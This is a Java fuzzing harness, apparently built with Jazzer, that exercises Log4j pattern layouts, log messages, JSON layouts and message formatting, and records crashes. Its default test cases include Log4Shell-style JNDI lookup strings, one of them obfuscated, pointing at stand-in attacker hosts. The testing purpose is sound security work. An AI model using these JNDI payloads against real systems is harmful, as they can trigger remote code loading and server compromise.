package org.example;

import com.code_intelligence.jazzer.api.FuzzedDataProvider;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.ThreadContext;
import org.apache.logging.log4j.core.impl.Log4jLogEvent;
import org.apache.logging.log4j.core.layout.PatternLayout;
import org.apache.logging.log4j.message.SimpleMessage;
import org.apache.logging.log4j.core.LogEvent;

import java.io.File;
import java.io.FileReader;
import java.io.BufferedReader;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class Log4jFuzzer {
    private static final Logger logger = LogManager.getLogger(Log4jFuzzer.class);
    private static long startTime = System.currentTimeMillis();
    private static long totalExecutions = 0;
    private static int crashCount = 0;
    private static final List<String> TEST_CASES = new ArrayList<>();
    private static final Random RANDOM = new Random();
    private static boolean loadedTestCases = false;

    static {
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            System.out.println("Shutting down fuzzer, generating final report...");
            generateReport();
        }));

        // Load test cases from our generated files
        loadTestCases();
    }

    private static void loadTestCases() {
        try {
            File corpusDir = new File("../llm_fuzzer/generated_tests/corpus");
            if (corpusDir.exists() && corpusDir.isDirectory()) {
                for (File file : corpusDir.listFiles()) {
                    if (file.isFile() && file.getName().endsWith(".txt")) {
                        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
                            StringBuilder content = new StringBuilder();
                            String line;
                            while ((line = reader.readLine()) != null) {
                                content.append(line).append("\n");
                            }
                            TEST_CASES.add(content.toString());
                        }
                    }
                }
                System.out.println("Loaded " + TEST_CASES.size() + " test cases from corpus directory");
                loadedTestCases = true;
            } else {
                System.out.println("Corpus directory not found at " + corpusDir.getAbsolutePath());
                addDefaultTestCases();
            }
        } catch (IOException e) {
            System.err.println("Error loading test cases: " + e.getMessage());
            addDefaultTestCases();
        }
    }

    private static void addDefaultTestCases() {
        // Add some default test cases in case our corpus isn't available
        TEST_CASES.add("${jndi:ldap://malicious.example.com/payload}");
        TEST_CASES.add("%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n");
        TEST_CASES.add("{\"key\": \"value\", \"jndi\": \"${jndi:rmi://localhost:1099/jndiLookup}\"}");
        TEST_CASES.add("${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://malicious.com/}");
        TEST_CASES.add("%notaformat %anothernonformat %%percent");
        System.out.println("Added " + TEST_CASES.size() + " default test cases");
        loadedTestCases = true;
    }

    public static void fuzzerTestOneInput(FuzzedDataProvider data) {
        totalExecutions++;

        // Make sure test cases are loaded
        if (!loadedTestCases) {
            loadTestCases();
        }

        // Determine whether to use a predefined test case or raw data
        boolean usePredefined = !TEST_CASES.isEmpty() &&
                data.remainingBytes() > 0 &&
                data.consumeBoolean();

        String specialTestCase = null;
        if (usePredefined) {
            int index = Math.abs(data.consumeInt()) % TEST_CASES.size();
            specialTestCase = TEST_CASES.get(index);
            System.out.println("Using special test case: " +
                    (specialTestCase.length() > 50 ?
                            specialTestCase.substring(0, 50) + "..." :
                            specialTestCase));
        }

        try {
            // 1. Fuzz PatternLayout
            if (specialTestCase != null && specialTestCase.contains("%")) {
                fuzzPatternLayout(data, specialTestCase);
            } else {
                fuzzPatternLayout(data);
            }

            // 2. Fuzz Log Messages
            if (specialTestCase != null) {
                fuzzLogMessages(data, specialTestCase);
            } else {
                fuzzLogMessages(data);
            }

            // 3. Fuzz JSON Layout
            if (specialTestCase != null && specialTestCase.contains("{")) {
                fuzzJsonLayout(data, specialTestCase);
            } else {
                fuzzJsonLayout(data);
            }

            // 4. Fuzz Message Pattern
            if (specialTestCase != null && specialTestCase.contains("{")) {
                fuzzMessagePattern(data, specialTestCase);
            } else {
                fuzzMessagePattern(data);
            }

            // Generate a report after a certain time
            if (totalExecutions % 1000 == 0 && System.currentTimeMillis() - startTime > 60000) {
                generateReport();
            }
        } catch (Exception e) {
            recordCrash("Main fuzzer method with input: " +
                    (specialTestCase != null ? specialTestCase : "generated data"), e);
        }
    }

    private static void fuzzPatternLayout(FuzzedDataProvider data) {
        String pattern = "";
        try {
            // Ensure we have some data to consume
            if (data.remainingBytes() > 0) {
                pattern = data.consumeString(Math.min(100, data.remainingBytes()));
            } else {
                pattern = "%m%n"; // Default pattern if no data
            }

            PatternLayout layout = PatternLayout.newBuilder()
                    .withPattern(pattern)
                    .build();

            LogEvent event = Log4jLogEvent.newBuilder()
                    .setLoggerName("FuzzerLogger")
                    .setLevel(Level.INFO)
                    .setMessage(new SimpleMessage("Fuzzed layout test"))
                    .build();

            layout.toByteArray(event);
        } catch (Exception e) {
            recordCrash("PatternLayout with pattern: " + pattern, e);
        }
    }

    private static void fuzzPatternLayout(FuzzedDataProvider data, String pattern) {
        try {
            PatternLayout layout = PatternLayout.newBuilder()
                    .withPattern(pattern)
                    .build();

            LogEvent event = Log4jLogEvent.newBuilder()
                    .setLoggerName("FuzzerLogger")
                    .setLevel(Level.INFO)
                    .setMessage(new SimpleMessage("Fuzzed layout test"))
                    .build();

            layout.toByteArray(event);
        } catch (Exception e) {
            recordCrash("PatternLayout with special pattern: " + pattern, e);
        }
    }

    private static void fuzzLogMessages(FuzzedDataProvider data) {
        String message = "";
        try {
            // Ensure we have data to consume
            if (data.remainingBytes() > 0) {
                message = data.consumeString(Math.min(100, data.remainingBytes()));
            } else {
                message = "default message";
            }

            // Test logging the fuzzer-generated message
            logger.info("Test message: {}", message);
            logger.error("Error with parameter: {}", message);

            // Try a dynamic log level if we have more data
            if (data.remainingBytes() > 0) {
                String levelStr = data.consumeString(Math.min(10, data.remainingBytes())).toUpperCase();
                Level level = Level.toLevel(levelStr, Level.INFO);
                logger.log(level, "Message at dynamic level: {}", message);
            }

            // Try context-based logging
            ThreadContext.put("fuzzKey", message);
            logger.info("Context map with fuzzed key: {}", message);
            ThreadContext.clearAll();
        } catch (Exception e) {
            recordCrash("LogMessages with message: " + message, e);
        }
    }

    private static void fuzzLogMessages(FuzzedDataProvider data, String message) {
        try {
            // Test logging the fuzzer-generated message
            logger.info("Test message: {}", message);
            logger.error("Error with parameter: {}", message);

            // Try a dynamic log level if we have more data
            if (data.remainingBytes() > 0) {
                String levelStr = data.consumeString(Math.min(10, data.remainingBytes())).toUpperCase();
                Level level = Level.toLevel(levelStr, Level.INFO);
                logger.log(level, "Message at dynamic level: {}", message);
            }

            // Try context-based logging
            ThreadContext.put("fuzzKey", message);
            logger.info("Context map with fuzzed key: {}", message);
            ThreadContext.clearAll();
        } catch (Exception e) {
            recordCrash("LogMessages with special message: " + message, e);
        }
    }

    private static void fuzzJsonLayout(FuzzedDataProvider data) {
        try {
            // Try to dynamically check if the Jackson classes are available
            try {
                Class.forName("com.fasterxml.jackson.databind.ser.FilterProvider");

                // Only proceed if the class is available
                // Safely handle the input
                boolean properties = data.remainingBytes() > 0 ? data.consumeBoolean() : false;
                boolean complete = data.remainingBytes() > 0 ? data.consumeBoolean() : false;
                boolean compact = data.remainingBytes() > 0 ? data.consumeBoolean() : false;
                boolean eventEol = data.remainingBytes() > 0 ? data.consumeBoolean() : false;
                boolean includeStacktrace = data.remainingBytes() > 0 ? data.consumeBoolean() : false;

                // Test JSON layout
                org.apache.logging.log4j.core.layout.JsonLayout layout =
                        org.apache.logging.log4j.core.layout.JsonLayout.newBuilder()
                                .setProperties(properties)
                                .setComplete(complete)
                                .setCompact(compact)
                                .setEventEol(eventEol)
                                .setIncludeStacktrace(includeStacktrace)
                                .build();

                // Create a test log event
                String message = data.remainingBytes() > 0 ?
                        data.consumeString(Math.min(100, data.remainingBytes())) :
                        "default message";

                org.apache.logging.log4j.core.LogEvent event =
                        org.apache.logging.log4j.core.impl.Log4jLogEvent.newBuilder()
                                .setLoggerName("test")
                                .setLevel(org.apache.logging.log4j.Level.INFO)
                                .setMessage(new org.apache.logging.log4j.message.SimpleMessage(message))
                                .build();

                // Format the event
                layout.toSerializable(event);
            } catch (ClassNotFoundException e) {
                // Jackson dependency is missing, skip this test silently
                System.out.println("Skipping JsonLayout test - Jackson dependency not available");
            }
        } catch (Exception e) {
            recordCrash("JsonLayout", e);
        }
    }

    private static void fuzzJsonLayout(FuzzedDataProvider data, String jsonContent) {
        try {
            try {
                Class.forName("com.fasterxml.jackson.databind.ser.FilterProvider");

                // Only proceed if the class is available
                boolean properties = data.remainingBytes() > 0 ? data.consumeBoolean() : false;
                boolean complete = data.remainingBytes() > 0 ? data.consumeBoolean() : false;
                boolean compact = data.remainingBytes() > 0 ? data.consumeBoolean() : false;
                boolean eventEol = data.remainingBytes() > 0 ? data.consumeBoolean() : false;
                boolean includeStacktrace = data.remainingBytes() > 0 ? data.consumeBoolean() : false;

                // Test JSON layout
                org.apache.logging.log4j.core.layout.JsonLayout layout =
                        org.apache.logging.log4j.core.layout.JsonLayout.newBuilder()
                                .setProperties(properties)
                                .setComplete(complete)
                                .setCompact(compact)
                                .setEventEol(eventEol)
                                .setIncludeStacktrace(includeStacktrace)
                                .build();

                // Create a test log event with the special JSON content
                org.apache.logging.log4j.core.LogEvent event =
                        org.apache.logging.log4j.core.impl.Log4jLogEvent.newBuilder()
                                .setLoggerName("test")
                                .setLevel(org.apache.logging.log4j.Level.INFO)
                                .setMessage(new org.apache.logging.log4j.message.SimpleMessage(jsonContent))
                                .build();

                // Format the event
                layout.toSerializable(event);
            } catch (ClassNotFoundException e) {
                System.out.println("Skipping JsonLayout test - Jackson dependency not available");
            }
        } catch (Exception e) {
            recordCrash("JsonLayout with special content: " + jsonContent, e);
        }
    }

    private static void fuzzMessagePattern(FuzzedDataProvider data) {
        String pattern = "";
        try {
            // Test message pattern formatting with at least some content
            if (data.remainingBytes() > 0) {
                pattern = data.consumeString(Math.min(50, data.remainingBytes()));
            } else {
                pattern = "Default pattern";
            }

            String param1 = data.remainingBytes() > 0 ?
                    data.consumeString(Math.min(20, data.remainingBytes())) :
                    "param1";

            String param2 = data.remainingBytes() > 0 ?
                    data.consumeString(Math.min(20, data.remainingBytes())) :
                    "param2";

            org.apache.logging.log4j.message.MessageFormatMessage message =
                    new org.apache.logging.log4j.message.MessageFormatMessage(
                            pattern,
                            param1,
                            param2);

            // Format the message
            message.getFormattedMessage();
        } catch (Exception e) {
            recordCrash("MessagePattern with pattern: " + pattern, e);
        }
    }

    private static void fuzzMessagePattern(FuzzedDataProvider data, String pattern) {
        try {
            String param1 = data.remainingBytes() > 0 ?
                    data.consumeString(Math.min(20, data.remainingBytes())) :
                    "param1";

            String param2 = data.remainingBytes() > 0 ?
                    data.consumeString(Math.min(20, data.remainingBytes())) :
                    "param2";

            org.apache.logging.log4j.message.MessageFormatMessage message =
                    new org.apache.logging.log4j.message.MessageFormatMessage(
                            pattern,
                            param1,
                            param2);

            // Format the message
            message.getFormattedMessage();
        } catch (Exception e) {
            recordCrash("MessagePattern with special pattern: " + pattern, e);
        }
    }

    private static void recordCrash(String input, Exception e) {
        crashCount++;
        try (FileWriter writer = new FileWriter("fuzzing_crashes.txt", true)) {
            writer.write("=== CRASH #" + crashCount + " ===\n");
            writer.write("Input: " + input + "\n");
            writer.write("Exception: " + e.getClass().getName() + ": " + e.getMessage() + "\n");

            // Record stack trace
            writer.write("Stack trace:\n");
            for (StackTraceElement element : e.getStackTrace()) {
                writer.write("  " + element.toString() + "\n");
            }
            writer.write("============\n\n");
        } catch (IOException ioEx) {
            System.err.println("Failed to write crash: " + ioEx.getMessage());
        }
    }

    private static void generateReport() {
        try (FileWriter writer = new FileWriter("fuzzing_summary.txt")) {
            writer.write("Fuzzing Summary:\n");
            writer.write("----------------\n");
            writer.write("Total executions: " + totalExecutions + "\n");
            writer.write("Total runtime: " + (System.currentTimeMillis() - startTime) / 1000 + " seconds\n");
            writer.write("Average executions per second: " +
                    (totalExecutions / ((System.currentTimeMillis() - startTime) / 1000.0)) + "\n");
            writer.write("Total crashes detected: " + crashCount + "\n");
            writer.write("Used LLM-generated test cases: " + (loadedTestCases ? "Yes" : "No") + "\n");
            writer.write("Number of test cases: " + TEST_CASES.size() + "\n");

            writer.write("\nThis summary shows how many fuzzing iterations were executed.\n");
            writer.write("While we can't directly measure code coverage of Log4j,\n");
            writer.write("higher execution counts generally correlate with better coverage.\n");

            // Add crash information
            writer.write("\nCrash Summary:\n");
            if (new File("fuzzing_crashes.txt").exists()) {
                writer.write("Crashes detected and saved to fuzzing_crashes.txt\n");
                // You could process the file here to count unique crash types
            } else {
                writer.write("No crashes detected.\n");
            }
        } catch (IOException e) {
            System.err.println("Failed to write fuzzing report: " + e.getMessage());
        }
    }
}